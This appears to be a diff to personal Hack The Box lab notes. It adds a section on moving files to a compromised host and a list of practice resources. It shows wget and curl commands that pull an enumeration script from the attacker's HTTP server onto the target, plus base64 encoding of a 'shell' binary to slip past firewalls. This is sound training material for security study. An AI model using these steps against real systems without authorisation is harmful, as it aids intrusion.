@@ -934,3 +934,102 @@ ls
 cat flag.txt
 HTB{pr1v1l363_35c4l4710n_2_r007}
 ```
+
+# Transferring Files
+It's likely that we will need to transfer files to the remote server, such as enumeration scripts or exploits.
+## Using wget
+The first method we are going to see is running a Python HTTP server on our machine and then using wget or cURL to download the file on the remote host. We go into the directory that contains the file we need to transfer and run a Python HTTP server in it:
+**Local host**
+```
+cd /tmp
+python3 -m http.server 8000
+```
+
+**Remote host**
+```shell-session
+wget http://10.10.14.1:8000/linenum.sh
+```
+```shell-session
+curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
+```
+
+> We use the `-o` flag to specify the output file name.
+## Using SCP
+We can do so as follows:
+```shell-session
+scp linenum.sh user@remotehost:/tmp/linenum.sh
+```
+
+> Note that we specified the local file name after scp, and the remote directory will be saved to after the ":".
+
+## Using Base64
+There are some cases where it is not possible to transfer the file, it could be because of firewall protections that prevent us from downloading a file from our machine. In this kind of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it. 
+
+For example, if we wanted to transfer a binary file called shell, we can base64 encode it as follows:
+```shell-session
+base64 shell -w 0
+```
+
+Now, we can copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file:
+```shell-session
+echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
+```
+
+## Validating File Transfers
+We can run the file command on it:
+```shell-session
+file shell
+shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
+```
+
+When we run the file command on the shell file, it says that it is an ELF binary, meaning that we succesfully transferred it. To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. We can run md5sum on it:
+```shell-session
+md5sum shell
+
+321de1d7e7c3735838890a72c9ae7d1d shell
+```
+
+No, we can go to the remote server and run the same command on the file we transferred:
+```shell-session
+md5sum shell
+
+321de1d7e7c3735838890a72c9ae7d1d shell
+```
+
+Both files have the same md5 hash, meaning the file was transferred correctly. 
+
+# Starting Out
+It's always good to review the walkthrough of the retired machines to learn in different ways. 
+
+## Resources
+### Vulnerable Machines/Applications
+- OWASP Juice Shop
+- Metasploitable 2
+- Metasploitable 3
+- DVWA: This is a vulnerable PHP/MySQL web application showcasing many common web application vulnerabilities with varying degrees of difficulty.
+
+### YouTube Channels
+- IppSec: Provides an extremely in-depth walkthrough of every retired HTB box packed full of insight.
+- VbScrub: Provides HTB videos as well as videos on techniques, primarily focusing on Active Directory exploitation.
+- STÖK: Bug bounties and web application penetration testing
+- LiveOverflow: Provides videos on a wide variety of technical infosec topics.
+### Blogs
+- 0xdf hacks tuff. Walkthroughs of most retired HTB boxes.
+
+### Tutorial Websites
+- Under The Wire
+- Over The Wire
+
+### HTB
+- Tracks
+- Machines:
+	- Lame
+	- Blue
+	- Nibbles
+	- Shocker
+	- Jerry
+- Challenges:
+	- Find The Easy Pass
+	- Weak RSA
+	- You know 0xDiablos
+- Dante Pro Lab
